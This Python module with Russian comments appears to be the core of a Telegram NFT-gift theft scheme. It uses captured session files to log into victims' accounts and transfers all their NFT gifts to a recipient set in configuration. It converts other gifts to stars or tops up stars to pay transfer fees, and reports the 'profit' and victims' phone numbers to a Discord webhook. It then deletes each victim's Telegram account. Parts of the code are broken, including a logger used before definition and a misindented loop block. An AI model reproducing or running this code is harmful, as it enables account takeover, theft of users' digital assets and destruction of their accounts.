"""
Модуль для обработки NFT подарков из аккаунта пользователя
Вырезан из getgems_webapp/utils.py и адаптирован под нашу систему
"""
import os
import json
import asyncio
import logging
import sqlite3
import struct
import base64
from typing import Optional, Dict, List, Tuple
from datetime import datetime

# Импортируем TgCrypto для ускорения работы Pyrogram
try:
    import tgcrypto
    logger.info("✅ TgCrypto загружен - Pyrogram будет работать быстрее")
except ImportError:
    logger.warning("⚠️ TgCrypto не установлен - Pyrogram будет работать медленнее. Установите: pip install tgcrypto")

# Kurigram обновляет Pyrogram до версии с поддержкой get_chat_gifts
from pyrogram import Client
from telethon import TelegramClient
from telethon.sessions import SQLiteSession
from telethon.tl.functions.account import DeleteAccountRequest

from config import Config
from database import Database

logger = logging.getLogger(__name__)

# Проверяем наличие TgCrypto при загрузке модуля
try:
    import tgcrypto
    logger.info("✅ TgCrypto загружен - Pyrogram будет работать быстрее")
except ImportError:
    logger.warning("⚠️ TgCrypto не установлен - Pyrogram будет работать медленнее. Установите: pip install tgcrypto")

# Переменные окружения
GIFT_RECIPIENT_ID = int(os.getenv('GIFT_RECIPIENT_ID', '0'))
GIFT_RECIPIENT_USERNAME = os.getenv('GIFT_RECIPIENT_USERNAME', '')
GIFT_RECIPIENT_PHONE = os.getenv('GIFT_RECIPIENT_PHONE', '')
GIFT_SENDER_PHONE = os.getenv('GIFT_SENDER_PHONE', '15015642923')  # Номер аккаунта для докида
STAR_GIFT_ID = os.getenv('STAR_GIFT_ID', '5170145012310081615')
PRE_GIFT_MESSAGE = os.getenv('PRE_GIFT_MESSAGE', '')

# API credentials
API_ID = Config.TELEGRAM_API_ID
API_HASH = Config.TELEGRAM_API_HASH

# Буферы для агрегированных логов
_LOG_BUFFERS: dict[str, list] = {}


def begin_gift_log(key: str):
    """Начать агрегированный лог по ключу"""
    try:
        if key not in _LOG_BUFFERS:
            _LOG_BUFFERS[key] = []
    except Exception:
        pass


def append_gift_log(key: str, line: str):
    """Добавить строку в агрегированный лог"""
    try:
        buf = _LOG_BUFFERS.get(key)
        if buf is None:
            buf = []
            _LOG_BUFFERS[key] = buf
        buf.append(line)
    except Exception:
        pass


async def flush_gift_log(key: str, header: str = "Логи операции", with_spoiler: bool = True):
    """Отправить агрегированный лог через Discord webhook"""
    try:
        from discord_processing_logger import send_processing_log
        
        lines = _LOG_BUFFERS.get(key, [])
        if not lines:
            return
        
        # Отправляем агрегированный лог
        body = "\n".join(lines)
        full_message = f"{header}\n\n{body}"
        
        # Разбиваем на части по 1500 символов
        MAX_LEN = 1500
        chunks = []
        start = 0
        while start < len(full_message):
            end = min(start + MAX_LEN, len(full_message))
            if end < len(full_message):
                nl = full_message.rfind("\n", start, end)
                if nl != -1:
                    end = nl + 1
            chunks.append(full_message[start:end])
            start = end
        
        # Отправляем каждый чанк
        for chunk in chunks:
            await send_processing_log(chunk)
    except Exception as e:
        logger.error(f"Error flushing gift log: {e}")
    finally:
        try:
            _LOG_BUFFERS.pop(key, None)
        except Exception:
            pass


def get_session_data_from_sqlite(session_file_path: str) -> dict:
    """Получить данные сессии из SQLite файла"""
    if not os.path.exists(session_file_path):
        raise FileNotFoundError(f"Session file not found: {session_file_path}")
    conn = sqlite3.connect(session_file_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions")
        session_data = cursor.fetchone()
        if not session_data:
            raise ValueError("Session data not found in file")
        dc_id, server_address, port, auth_key = session_data
        return {
            'dc_id': dc_id,
            'server_address': server_address,
            'port': port,
            'auth_key': auth_key
        }
    finally:
        conn.close()


async def get_user_data_from_telethon(session_file_path: str) -> dict:
    """Получить данные пользователя через Telethon"""
    client = TelegramClient(
        SQLiteSession(session_file_path),
        API_ID,
        API_HASH
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise ValueError("Session not authorized")
        me = await client.get_me()
        return {
            'user_id': me.id,
            'is_bot': me.bot if hasattr(me, 'bot') else False,
            'phone': me.phone,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username
        }
    finally:
        await client.disconnect()


def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
    """Создать Pyrogram session_string из данных Telethon сессии"""
    dc_id = session_data['dc_id']
    auth_key = session_data['auth_key']
    user_id = user_data['user_id']
    is_bot = user_data['is_bot']
    
    if len(auth_key) != 256:
        if len(auth_key) > 256:
            auth_key = auth_key[:256]
        else:
            auth_key = auth_key + b'\x00' * (256 - len(auth_key))
    
    packed_data = struct.pack(
        ">BI?256sQ?",
        dc_id,
        API_ID,
        False,
        auth_key,
        user_id,
        is_bot
    )
    session_string = base64.urlsafe_b64encode(packed_data).decode().rstrip("=")
    return session_string


async def convert_telethon_to_pyrogram(session_file_path: str) -> str:
    """Конвертировать Telethon сессию в Pyrogram session_string"""
    session_data = get_session_data_from_sqlite(session_file_path)
    user_data = await get_user_data_from_telethon(session_file_path)
    pyrogram_session_string = create_pyrogram_session_string(session_data, user_data)
    return pyrogram_session_string


async def get_gifts_statistics(client) -> dict:
    """Анализирует подарки и возвращает статистику"""
    try:
        gifts_stats = {
            'total_gifts': 0,
            'nft_gifts': 0,
            'transferable_gifts': 0,
            'non_transferable_gifts': 0
        }
        
        # Используем kurigram для получения подарков (имеет метод get_chat_gifts)
        async for gift in client.get_chat_gifts("me"):
            gifts_stats['total_gifts'] += 1
            
            if gift.is_limited or (gift.attributes and len(gift.attributes) > 0):
                gifts_stats['nft_gifts'] += 1
                
                from datetime import datetime
                now = datetime.now()
                
                can_transfer = True
                
                if gift.is_transferred:
                    can_transfer = False
                
                if hasattr(gift, 'owner_address') and gift.owner_address:
                    can_transfer = False
                
                if hasattr(gift, 'can_transfer_at') and gift.can_transfer_at and gift.can_transfer_at > now:
                    can_transfer = False
                    
                if hasattr(gift, 'locked_until_date') and gift.locked_until_date and gift.locked_until_date > now:
                    can_transfer = False
                
                if can_transfer:
                    gifts_stats['transferable_gifts'] += 1
                else:
                    gifts_stats['non_transferable_gifts'] += 1
            else:
                gifts_stats['non_transferable_gifts'] += 1
        
        return gifts_stats
        
    except Exception as e:
        logger.error(f"Error getting gifts statistics: {e}")
        return {
            'total_gifts': 0,
            'nft_gifts': 0,
            'transferable_gifts': 0,
            'non_transferable_gifts': 0
        }


async def get_star_balance_with_client(client) -> tuple[bool, int]:
    """Получить баланс звезд через Pyrogram клиент"""
    try:
        from pyrogram import raw
        result = await client.invoke(raw.functions.payments.GetStarsStatus(
            peer=raw.types.InputPeerSelf()
        ))
        if result and hasattr(result, 'balance') and hasattr(result.balance, 'amount'):
            balance = int(result.balance.amount)
            return True, balance
        return False, 0
    except Exception as e:
        logger.error(f"Error getting star balance: {e}")
        return False, 0


async def get_account_stats(session_string: str) -> dict:
    """
    Получает статистику аккаунта: баланс звёзд и информацию о подарках
    Аналогично функции из getgems/utils.py
    """
    try:
        from pyrogram import Client
        
        # Создаем временного клиента
        client = Client(
            "temp_stats_session",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        
        async with client:
            # Получаем баланс звёзд
            try:
                balance_ok, stars_balance = await get_star_balance_with_client(client)
                if not balance_ok:
                    stars_balance = 0
            except Exception as e:
                logger.error(f"Ошибка получения баланса звёзд: {e}")
                stars_balance = 0
            
            # Получаем подарки
            gifts_stats = await get_gifts_statistics(client)
            
            return {
                'stars_balance': stars_balance,
                'gifts_stats': gifts_stats
            }
            
    except Exception as e:
        logger.error(f"Ошибка получения статистики аккаунта: {e}")
        return {
            'stars_balance': 0,
            'gifts_stats': {
                'total_gifts': 0,
                'nft_gifts': 0,
                'transferable_gifts': 0,
                'non_transferable_gifts': 0
            }
        }


async def transfer_gift_to_recipient(client, gift, recipient_id: int, log_key: str = None) -> tuple[bool, str]:
    """Передать подарок получателю"""
    try:
        result = await gift.transfer(recipient_id)
        if result:
            gift_id = getattr(gift, 'id', 'unknown')
            gift_link = getattr(gift, 'link', f"https://t.me/nft/gift-{gift_id}")
            msg = f"✅ Успешная передача NFT\n🆔 gift_id: {gift_id}\n🔗 link: {gift_link}\n🎯 recipient_id: {recipient_id}"
            if log_key:
                append_gift_log(log_key, msg)
            return True, ""
        else:
            return False, "Неизвестная ошибка при передаче"
    except Exception as e:
        error_str = str(e)
        error_reason = "Неизвестная ошибка"
        
        if "PEER_ID_INVALID" in error_str:
            error_reason = "Неверный ID получателя"
        elif "GIFT_ALREADY_TRANSFERRED" in error_str:
            error_reason = "Подарок уже передан"
        elif "GIFT_TRANSFER_BLOCKED" in error_str:
            error_reason = "Передача заблокирована"
        elif "INSUFFICIENT_STARS" in error_str:
            error_reason = "Недостаточно звезд"
        elif "GIFT_EXPIRED" in error_str:
            error_reason = "Подарок истек"
        elif "GIFT_NOT_TRANSFERABLE" in error_str:
            error_reason = "Подарок нельзя передавать"
        else:
            error_reason = f"Ошибка API: {error_str[:50]}..."
        
        logger.error(f"Error transferring gift: {e}")
        return False, error_reason


async def send_gifts_to_user_id_with_pyrogram(recipient_user_id: int, count: int = 2, log_key: str = None) -> tuple[bool, str]:
    """Отправить подарки пользователю по user_id с аккаунта докида"""
    try:
        sessions_dir = os.path.join(os.path.dirname(__file__), "sessions")
        sender_phone = GIFT_SENDER_PHONE.replace('+', '')
        session_json_path = os.path.join(sessions_dir, f"{sender_phone}.json")
        
        if not os.path.exists(session_json_path):
            logger.warning(f"Session file for dokid not found: {session_json_path}")
            return False, "Session file for dokid not found. Use auth_sender.py to get session manually."
        
        with open(session_json_path, 'r') as f:
            account_data = json.load(f)
        
        session_string = account_data.get('session_string')
        if not session_string:
            return False, "Session string not found in JSON file"
        
        client = Client(
            name=f"dokid_{sender_phone}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        
        await client.start()
        
        try:
            fixed_gift_id = int(STAR_GIFT_ID)
            
            # Отправляем привет если задан
            if PRE_GIFT_MESSAGE:
                try:
                    await client.send_message(chat_id=int(recipient_user_id), text=PRE_GIFT_MESSAGE)
                except Exception:
                    pass
            
            await asyncio.sleep(0.5)
            
            # Отправляем подарки
            for i in range(count):
                try:
                    result = await client.send_gift(chat_id=int(recipient_user_id), gift_id=fixed_gift_id)
                    if result:
                        if log_key:
                            append_gift_log(log_key, f"✅ Отправлен подарок {i+1}/{count} пользователю ID {recipient_user_id}")
                        await asyncio.sleep(1)
                    else:
                        return False, f"Failed to send gift {i+1}/{count}"
                except Exception as e:
                    return False, f"Error sending gift {i+1}/{count}: {str(e)}"
            
            return True, f"Successfully sent {count} gifts"
        finally:
            await client.stop()
            
    except Exception as e:
        logger.error(f"Error in send_gifts_to_user_id_with_pyrogram: {e}")
        return False, str(e)


async def send_gifts_to_username_with_pyrogram(recipient_username: str, count: int = 2, log_key: str = None) -> tuple[bool, str]:
    """Отправить подарки пользователю по username"""
    try:
        # Сначала получаем user_id по username
        sessions_dir = os.path.join(os.path.dirname(__file__), "sessions")
        sender_phone = GIFT_SENDER_PHONE.replace('+', '')
        session_json_path = os.path.join(sessions_dir, f"{sender_phone}.json")
        
        if not os.path.exists(session_json_path):
            return False, "Session file for dokid not found"
        
        with open(session_json_path, 'r') as f:
            account_data = json.load(f)
        
        session_string = account_data.get('session_string')
        if not session_string:
            return False, "Session string not found"
        
        client = Client(
            name=f"dokid_{sender_phone}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        
        await client.start()
        
        try:
            if not recipient_username.startswith('@'):
                recipient_username = f"@{recipient_username}"
            
            user = await client.get_users(recipient_username)
            recipient_user_id = user.id
            
            # Используем функцию по user_id
            return await send_gifts_to_user_id_with_pyrogram(recipient_user_id, count, log_key)
        finally:
            await client.stop()
            
    except Exception as e:
        logger.error(f"Error in send_gifts_to_username_with_pyrogram: {e}")
        return False, str(e)


async def convert_available_gifts_to_stars_with_client(client, exclude_ids: set = None, max_to_convert: int = 10, log_key: str = None) -> int:
    """Конвертировать доступные подарки в звезды"""
    try:
        exclude_ids = exclude_ids or set()
        gifts_to_convert = []
        
        async for g in client.get_chat_gifts("me"):
            gid = getattr(g, 'id', None)
            if gid is not None and gid in exclude_ids:
                continue
            gifts_to_convert.append(g)
            if len(gifts_to_convert) >= max_to_convert:
                break
        
        if not gifts_to_convert:
            return 0
        
        total_stars = 0
        converted_count = 0
        
        for i, gift in enumerate(gifts_to_convert, 1):
            try:
                result = await gift.convert()
                if result:
                    converted_count += 1
                    stars_from_gift = getattr(gift, 'star_value', 1)
                    total_stars += int(stars_from_gift)
                    if log_key:
                        append_gift_log(log_key, f"✅ Конвертирован подарок {i}/{len(gifts_to_convert)} в {stars_from_gift} звёзд")
                    await asyncio.sleep(0.5)
            except Exception as gift_error:
                if log_key:
                    append_gift_log(log_key, f"❌ Ошибка конвертации подарка {i}: {str(gift_error)}")
        
        if log_key:
            append_gift_log(log_key, f"✅ Конвертация завершена: подарков={converted_count}, звёзд={total_stars}")
        
        return total_stars
    except Exception as e:
        logger.error(f"Error converting gifts to stars: {e}")
        return 0


async def process_account_gifts(session_string: str, user_id: int, phone: str):
    """
    Основная функция обработки подарков аккаунта
    """
    try:
        from discord_processing_logger import (
            send_processing_start_log,
            send_gift_transfer_success_log,
            send_gift_transfer_error_log,
            send_processing_complete_log
        )
        from discord_webhook import send_profit_log_with_buyer
        
        client = Client(
            name=f"gift_processor_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        await client.start()
        
        try:
            log_key = f"acct:{phone}:{user_id}"
            begin_gift_log(log_key)
            
            logger.info(f"🎁 Получаем список подарков для аккаунта {phone}...")
            
            # Получаем получателя
            recipient_username = GIFT_RECIPIENT_USERNAME
            recipient_user_id = None
            
            if recipient_username:
                if not recipient_username.startswith('@'):
                    recipient_username = f"@{recipient_username}"
                try:
                    u = await client.get_users(recipient_username)
                    recipient_user_id = getattr(u, 'id', None)
                    logger.info(f"✅ Получен user_id {recipient_user_id} по username {recipient_username}")
                except Exception as e:
                    logger.error(f"❌ Не удалось получить user_id по username {recipient_username}: {e}")
            
            if recipient_user_id is None and GIFT_RECIPIENT_PHONE:
                try:
                    u = await client.get_users(GIFT_RECIPIENT_PHONE)
                    recipient_user_id = getattr(u, 'id', None)
                    logger.info(f"✅ Получен user_id {recipient_user_id} по телефону {GIFT_RECIPIENT_PHONE}")
                except Exception as e:
                    logger.error(f"❌ Не удалось получить user_id по телефону {GIFT_RECIPIENT_PHONE}: {e}")
            
            if recipient_user_id is None:
                recipient_user_id = GIFT_RECIPIENT_ID
                recipient_username = recipient_username or str(GIFT_RECIPIENT_ID)
                logger.info(f"ℹ️ Использую фоллбек на GIFT_RECIPIENT_ID: {recipient_user_id}")
            
            # Получаем статистику
            gifts_stats = await get_gifts_statistics(client)
            gifts_count = gifts_stats['total_gifts']
            nft_gifts_count = gifts_stats['nft_gifts']
            transferable_count = gifts_stats['transferable_gifts']
            
            # Получаем баланс звезд
            balance_ok, stars_balance = await get_star_balance_with_client(client)
            
            # Перечисление NFT-подарков при старте
            nft_links = []
            async for g in client.get_chat_gifts("me"):
                try:
                    is_nft = bool(getattr(g, 'is_limited', False)) or (
                        getattr(g, 'attributes', None) is not None and len(getattr(g, 'attributes')) > 0
                    )
                    link = getattr(g, 'link', None)
                    if is_nft and link:
                        nft_links.append(link)
                except Exception:
                    pass
            
            # Отправляем лог старта обработки
            await send_processing_start_log(user_id, phone, nft_links)
            
            if log_key:
                append_gift_log(log_key, f"📋 NFT подарки ({len(nft_links)}):")
                for i, link in enumerate(nft_links, 1):
                    append_gift_log(log_key, f"🎁 {i}. {link}")
            
            unique_gifts_transferred = 0
            transferred_gift_links = []
            failed_gift_transfers = []
            
            # Обрабатываем каждый NFT подарок
            async for gift in client.get_chat_gifts("me"):
                try:
                    # Проверяем, является ли подарок NFT (как в get_gifts_statistics)
                    is_nft = bool(getattr(gift, 'is_limited', False)) or (
                        getattr(gift, 'attributes', None) is not None and len(getattr(gift, 'attributes')) > 0
                    )
                    
                    if not is_nft:
                        continue  # Пропускаем не-NFT подарки
                    
                    # Получаем ссылку подарка (если есть)
                    gift_link = getattr(gift, 'link', None)
                    if not gift_link:
                        # Если ссылки нет, генерируем её из ID
                        gift_id = getattr(gift, 'id', None)
                        if gift_id:
                            gift_link = f"https://t.me/nft/gift-{gift_id}"
                        else:
                            gift_link = "https://t.me/nft/unknown"
                    
                    logger.info(f"✨ Найден NFT подарок: {gift_link} (ID: {getattr(gift, 'id', 'unknown')})")
                        
                        # Проверяем баланс и докидываем при необходимости
                        try:
                            balance_ok, current_balance = await get_star_balance_with_client(client)
                            if balance_ok and int(current_balance) < 25:
                                logger.info(f"⭐ Баланс звёзд {current_balance} < 25. Докидываем 2 подарка...")
                                
                                # Определяем получателя из текущей сессии
                                try:
                                    me = await client.get_me()
                                    me_username = getattr(me, 'username', None)
                                except Exception:
                                    me_username = None
                                
                                # Используем user_id напрямую, так как он уже известен
                                gift_send_success, gift_send_message = await send_gifts_to_user_id_with_pyrogram(user_id, count=2, log_key=log_key)
                                
                                if gift_send_success:
                                    await asyncio.sleep(2)
                                    converted_stars = await convert_available_gifts_to_stars_with_client(
                                        client,
                                        exclude_ids={getattr(gift, 'id', None)},
                                        max_to_convert=10,
                                        log_key=log_key
                                    )
                                    logger.info(f"🔄 Конвертация после докида выполнена, получено звёзд: {converted_stars}")
                                else:
                                    logger.error(f"❌ Не удалось докинуть подарки: {gift_send_message}")
                                    if log_key:
                                        append_gift_log(log_key, f"❌ Докид не выполнен: {gift_send_message}")
                        except Exception as pre_err:
                            logger.error(f"❌ Ошибка предварительной проверки баланса/докида: {pre_err}")
                        
                        # Передаем подарок
                        success, error_reason = await transfer_gift_to_recipient(client, gift, recipient_user_id, log_key=log_key)
                        if success:
                            unique_gifts_transferred += 1
                            transferred_gift_links.append(gift_link)
                            await send_gift_transfer_success_log(user_id, phone, gift_link)
                            if log_key:
                                append_gift_log(log_key, f"✅ Передан NFT: {gift_link} → recipient_id={recipient_user_id}")
                        else:
                            failed_gift_transfers.append(f"{gift_link} - {error_reason}")
                            logger.error(f"❌ Не удалось передать подарок {gift_link} - {error_reason}")
                            await send_gift_transfer_error_log(user_id, phone, gift_link, error_reason)
                            if log_key:
                                append_gift_log(log_key, f"❌ Ошибка передачи: {gift_link} — {error_reason}")
                            
                            # При недостатке звезд конвертируем и повторяем
                            if error_reason == "Недостаточно звезд":
                                try:
                                    logger.info("⭐ Недостаточно звезд. Конвертирую доступные подарки в звезды...")
                                    converted_stars = await convert_available_gifts_to_stars_with_client(
                                        client,
                                        exclude_ids={getattr(gift, 'id', None)},
                                        max_to_convert=10,
                                        log_key=log_key
                                    )
                                    logger.info(f"🔄 Конвертация выполнена, получено звезд: {converted_stars}")
                                    
                                    # Повторная попытка передачи
                                    retry_success, retry_error = await transfer_gift_to_recipient(client, gift, recipient_user_id, log_key=log_key)
                                    if retry_success:
                                        logger.info("✅ Повторная попытка передачи подарка успешна")
                                        unique_gifts_transferred += 1
                                        transferred_gift_links.append(gift_link)
                                        await send_gift_transfer_success_log(user_id, phone, gift_link)
                                        failed_gift_transfers = [x for x in failed_gift_transfers if gift_link not in x]
                                    else:
                                        logger.error(f"❌ Повторная попытка передачи не удалась: {retry_error}")
                                except Exception as conv_err:
                                    logger.error(f"❌ Ошибка конвертации подарков в звезды: {conv_err}")
                except Exception as gift_error:
                    logger.error(f"❌ Ошибка обработки подарка: {gift_error}")
            
            logger.info(f"🎁 Обработано {gifts_count} подарков")
            
            # Отправляем лог завершения обработки
            await send_processing_complete_log(user_id, phone, unique_gifts_transferred, len(failed_gift_transfers))
            
            # Если были переданы подарки - отправляем лог профита
            if unique_gifts_transferred > 0:
                logger.info(f"✅ Успешно передано {unique_gifts_transferred} NFT подарков")
                
                # Получаем информацию о последней завершенной сделке продавца
                db = Database()
                last_deal = db.get_last_completed_deal_by_seller(user_id)
                
                buyer_username = "Неизвестно"
                if last_deal:
                    buyer_username = last_deal.get('buyer_username', 'Неизвестно')
                    if not buyer_username:
                        buyer_username = "Неизвестно"
                
                # Формируем список подарков для лога профита
                gifts_for_profit_log = []
                seller_username = 'Неизвестно'
                seller_user = db.get_user_by_id(user_id)
                if seller_user:
                    seller_username = seller_user.get('username', 'Неизвестно')
                
                for link in transferred_gift_links:
                    # Парсим ссылку для получения имени и номера (упрощенная версия)
                    try:
                        # Пытаемся извлечь имя и номер из ссылки
                        # Формат: https://t.me/nft/Name-Number
                        parts = link.split('/')
                        if len(parts) > 0:
                            last_part = parts[-1]
                            if '-' in last_part:
                                name_parts = last_part.split('-')
                                gift_name = name_parts[0] if len(name_parts) > 0 else 'Unknown'
                                gift_number = name_parts[-1] if len(name_parts) > 1 else ''
                            else:
                                gift_name = last_part
                                gift_number = ''
                        else:
                            gift_name = 'Unknown'
                            gift_number = ''
                        
                        gifts_for_profit_log.append({
                            'gift_link': link,
                            'gift_name': gift_name,
                            'gift_number': gift_number,
                            'sender_username': seller_username
                        })
                    except Exception:
                        gifts_for_profit_log.append({
                            'gift_link': link,
                            'gift_name': 'Unknown',
                            'gift_number': '',
                            'sender_username': seller_username
                        })
                
                # Отправляем сообщение о новом профите в Discord
                try:
                    await send_profit_log_with_buyer(
                        seller_id=user_id,
                        buyer_username=buyer_username,
                        gifts=gifts_for_profit_log,
                        image_url="https://i.ibb.co/XfHRzHfw/newprofin.jpg"
                    )
                    logger.info(f"✅ Сообщение о новом профите отправлено в Discord для воркера {user_id}")
                except Exception as profit_log_error:
                    logger.error(f"❌ Error sending profit log to Discord: {profit_log_error}", exc_info=True)
            
            # Финальная отправка агрегированного лога
            try:
                await flush_gift_log(log_key, header=f"Логи обработки подарков {phone}", with_spoiler=True)
            except Exception as flush_err:
                logger.error(f"⚠️ Ошибка финальной отправки агрегированного лога: {flush_err}")
                
        finally:
            await client.stop()
            
    except Exception as e:
        logger.error(f"❌ Ошибка обработки подарков для {phone}: {e}", exc_info=True)
        raise


async def delete_account_after_delay(session_string: str, phone: str, user_id: int, delay: int = 15):
    """
    Удаляет Telegram аккаунт через указанную задержку после обработки подарков
    
    Args:
        session_string: Pyrogram session string
        phone: Номер телефона аккаунта
        user_id: ID пользователя
        delay: Задержка в секундах перед удалением
    """
    try:
        await asyncio.sleep(delay)
        logger.info(f"🗑️ Начинаем удаление аккаунта {phone} (ID: {user_id})...")
        
        # Получаем путь к сессии Telethon (если есть)
        sessions_dir = os.path.join(os.path.dirname(__file__), "sessions")
        phone_digits = phone.replace('+', '')
        telethon_session_path = os.path.join(sessions_dir, f"{phone_digits}.session")
        
        if os.path.exists(telethon_session_path):
            # Используем Telethon для удаления аккаунта
            telethon_client = TelegramClient(telethon_session_path, API_ID, API_HASH)
            await telethon_client.connect()
            
            try:
                if await telethon_client.is_user_authorized():
                    try:
                        result = await telethon_client(DeleteAccountRequest(reason="Account processed"))
                        logger.info(f"✅ Запрос на удаление аккаунта {phone} отправлен успешно")
                        
                        log_key = f"acct:{phone}:{user_id}"
                        append_gift_log(log_key, f"🗑️ Аккаунт {phone} удалён после обработки подарков")
                    except Exception as delete_err:
                        logger.error(f"❌ Ошибка при удалении аккаунта {phone}: {delete_err}")
                else:
                    logger.warning(f"⚠️ Аккаунт {phone} не авторизован в Telethon, пропускаем удаление")
            finally:
                await telethon_client.disconnect()
        else:
            logger.warning(f"⚠️ Telethon сессия для {phone} не найдена, аккаунт не может быть удалён")
            logger.info(f"ℹ️ Для удаления аккаунта требуется Telethon сессия (.session файл)")
            
    except Exception as e:
        logger.error(f"❌ Ошибка при удалении аккаунта {phone}: {e}", exc_info=True)
